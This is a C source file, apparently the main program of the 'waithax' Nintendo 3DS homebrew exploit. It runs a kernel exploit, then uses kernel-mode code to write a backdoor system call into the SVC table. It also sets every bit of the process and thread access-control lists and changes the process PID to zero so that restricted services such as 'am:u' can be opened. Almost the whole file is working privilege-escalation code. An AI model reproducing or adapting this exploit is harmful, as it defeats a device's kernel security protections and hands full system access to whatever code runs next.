#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include "waithax.h"
#include "utils.h"


// Shamelessly copied from
// https://github.com/Steveice10/memchunkhax2/blob/master/source/memchunkhax2.c#L16

#define OLDNEW(x)                    (g_is_new3ds ? x ## _NEW : x ## _OLD)

#define CURRENT_KTHREAD              (*((u8**)0xFFFF9000))
#define CURRENT_KPROCESS             (*((u8**)0xFFFF9004))

#define SVC_ACL_SIZE                 (0x10)

#define KPROCESS_ACL_START_OLD       (0x88)
#define KPROCESS_ACL_START_NEW       (0x90)

#define KPROCESS_PID_OFFSET_OLD      (0xB4)
#define KPROCESS_PID_OFFSET_NEW      (0xBC)

#define KTHREAD_THREADPAGEPTR_OFFSET (0x8C)
#define KSVCTHREADAREA_BEGIN_OFFSET  (0xC8)

#define EXC_VA_START                 ((u32*)0xFFFF0000)
#define EXC_SVC_VENEER_BRANCH        ((u32*)0xFFFF0008)

// Take note that this is not correct for all firmwares. But I don't want to
// support very old firmwares when there are already better exploits for them.
#define AXIWRAMDSP_RW_MAPPING_OFFSET (0xDFF00000 - 0x1FF00000)


static bool g_is_new3ds = false;
static u32 g_original_pid = 0;
static u32 *g_svc_table = NULL;
static u32 g_svcbackdoor_reimplement_result = 0;
static void *g_svcbackdoor_address = NULL;

static void K_ReimplementSvcBackdoor(void)
{
    // Turn interrupts off
    __asm__ volatile("cpsid aif");

    u32 **svcVeneer = decodeARMBranch(EXC_SVC_VENEER_BRANCH);
    u32 *svcHandler = svcVeneer[2];
    u32 *svcTable = svcHandler;

    // Searching for svc 0
    while(*++svcTable);
    g_svc_table = svcTable;

    // Already implemented ? (or fw too old?)
    if(svcTable[0x7b])
    {
        g_svcbackdoor_reimplement_result = 2;
        g_svcbackdoor_address = (void*)svcTable[0x7b];
        return;
    }

    // No 0x7b, let's reimplement it then
    u32 *freeSpace = EXC_VA_START;
    while(freeSpace[0] != 0xFFFFFFFF || freeSpace[1] != 0xFFFFFFFF)
        freeSpace++;

    u32 *freeSpaceRW = convertVAToPA(freeSpace) + AXIWRAMDSP_RW_MAPPING_OFFSET;
    u32 *svcTableRW = convertVAToPA(svcTable) + AXIWRAMDSP_RW_MAPPING_OFFSET;
    memcpy(freeSpaceRW, svcBackdoor_original, svcBackdoor_original_size);
    svcTableRW[0x7b] = (u32)freeSpace;
    g_svcbackdoor_address = freeSpace;
    g_svcbackdoor_reimplement_result = 1;

    flushEntireCaches();
}

static void K_PatchPID(void)
{
    u8 *proc = CURRENT_KPROCESS;
    u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

    g_original_pid = *pidPtr;

    // We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
    *pidPtr = 0;
}

static void K_RestorePID(void)
{
    u8 *proc = CURRENT_KPROCESS;
    u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

    // Restore the original PID
    *pidPtr = g_original_pid;
}

static void K_PatchACL(void)
{
    // Turn interrupts off
    __asm__ volatile("cpsid aif");

    // Patch the process first (for newly created threads).
    u8 *proc = CURRENT_KPROCESS;
    u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
    memset(procacl, 0xFF, SVC_ACL_SIZE);

    // Now patch the current thread.
    u8 *thread = CURRENT_KTHREAD;
    u8 *thread_pageend = *(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET);
    u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
    memset(thread_page, 0xFF, SVC_ACL_SIZE);
}


void initsrv_allservices(void)
{
    printf("Patching PID\n");
    svc_7b(K_PatchPID);

    printf("Reiniting srv:\n");
    srvExit();
    srvInit();

    // Not restoring the PID because we want it to stay like this if the next
    // started homebrew reinits srv or something similar.
    // Comment this return if you want/need to restore the PID.
    return;

    printf("Restoring PID\n");
    svc_7b(K_RestorePID);
}

void patch_svcaccesstable(void)
{
    printf("Patching SVC access table\n");
    waithax_backdoor(K_PatchACL);
}

int main(int argc, char **argv)
{
    Handle amHandle = 0;
    Result res;
    bool success = false;

    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);
    nsInit();
    aptInit();

    // Enables the New3DS speedup. Not being done inside waithax_run because
    // some app using this waithax implementation as a lib would want to not
    // have that speedup. Anyone wanting to use waithax in their application
    // should take note to not forget to enable this to speedup the exploit on
    // New3DS hardware.
    // Can not enable the speedup on some environments, for unknown reasons yet.
    osSetSpeedupEnable(true);

    APT_CheckNew3DS(&g_is_new3ds);
    printf("System type: %s\n", g_is_new3ds ? "New" : "Old");

    // This one should fail
    res = srvGetServiceHandleDirect(&amHandle, "am:u");
    printf("am:u 1st try: res=%08lx handle=%08lx\n", res, amHandle);
    if(amHandle)
        svcCloseHandle(amHandle);

    // Uncomment this to use svcBackdoor instead of waiting for the refcount to
    // be overflown. This needs svcBackdoor to be re-implemented on 11.0+ and
    // the SVC access tables or table checks to be patched.
    //waithax_debug(true);

    // Run the exploit
    printf("Running exploit\n\n");
    success = waithax_run();

    printf("\nExploit returned: %s\n", success ? "Success!" : "Failure.");
    if(!success)
        goto end;

    printf("Reimplementing svcBackdoor...\n");
    waithax_backdoor(K_ReimplementSvcBackdoor);

    if(!g_svcbackdoor_reimplement_result)
    {
        printf("Could not reimplement svcBackdoor :(\n");
        goto end;
    }

    printf(g_svcbackdoor_reimplement_result == 1
        ? "svcBackdoor successfully implemented\n"
        : "svcBackdoor already implemented\n");
    printf("Location: %08lx\n", (u32)g_svcbackdoor_address);
    printf("SVC table: %08lx\n", (u32)g_svc_table);

    patch_svcaccesstable();
    initsrv_allservices();

    printf("Cleaning up\n");
    waithax_cleanup();

    // This one hopefully won't
    res = srvGetServiceHandleDirect(&amHandle, "am:u");
    printf("am:u 2nd try: res=%08lx handle=%08lx\n\n", res, amHandle);
    if(amHandle)
        svcCloseHandle(amHandle);

    if(res == 0)
        printf("The exploit succeeded. You can now exit this and run another app needing elevated permissions.\n");

end:
    printf("Press START to exit.\n");

    while(aptMainLoop())
    {
        hidScanInput();
        if(hidKeysDown() & KEY_START)
            break;

        gfxFlushBuffers();
        gfxSwapBuffers();
        gspWaitForVBlank();
    }

    aptExit();
    nsExit();
    gfxExit();
    return 0;
}
